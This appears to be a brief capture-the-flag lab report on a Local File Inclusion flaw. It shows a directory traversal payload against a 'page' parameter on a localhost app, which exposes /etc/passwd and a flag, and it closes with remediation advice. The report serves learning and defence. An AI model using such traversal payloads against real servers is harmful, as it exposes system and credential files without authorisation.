## Laboratory Report: Local File Inclusion (LFI) Vulnerability

### Summary
Local File Inclusion (LFI) vulnerabilities allow attackers to access sensitive files on the server by manipulating file path parameters in web requests.

### Methodology
1. Identified a script that includes files based on user input, e.g.:
	```
	/script.php?page=index.html
	```
2. Tested for LFI by modifying the `page` parameter to traverse directories:
	```
	/script.php?page=../../../../../../../../etc/passwd
	```
3. In our case, the following link successfully exposed the contents of `/etc/passwd` and revealed the next flag:
	```
	http://localhost:8080/?page=../../../../../../../etc/passwd
	```

### Findings
- The application is vulnerable to LFI, allowing unauthorized access to sensitive system files.
- Attackers can leverage this to read configuration files, credentials, and other critical data.

### Recommendation
- Implement strict validation and sanitization of user-supplied file paths.
- Restrict file inclusion to a whitelist of allowed files and directories.
- Disable directory traversal and ensure proper access controls on the server.
